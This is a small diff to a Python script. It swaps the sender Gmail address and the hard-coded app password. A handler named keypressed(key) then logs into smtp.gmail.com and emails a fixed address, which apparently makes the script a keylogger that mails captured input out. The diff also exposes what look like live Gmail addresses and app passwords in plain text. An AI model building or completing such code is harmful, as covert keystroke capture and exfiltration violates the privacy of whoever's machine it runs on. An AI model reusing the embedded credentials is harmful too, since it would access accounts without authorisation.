@@ -1,7 +1,7 @@
 import smtplib
 
 to_email = 'sharkzdevelopement@gmail.com'
-from_email = 'sharkzdevelopement@gmail.com'
+from_email = 'dgfdfd193@gmail.com'
 message = 'hello'
 num_emails = 1
 
@@ -26,7 +26,7 @@ def keypressed(key):
                 with smtplib.SMTP('smtp.gmail.com','587') as smtpserver:
                     smtpserver.ehlo()
                     smtpserver.starttls()
-                    smtpserver.login(from_email,'ldbn axrv bkly nceo')
+                    smtpserver.login(from_email,'xezw yelm sjtv orej')
                     for i in range(num_emails):
                         smtpserver.sendmail(from_email,to_email,message)
                         
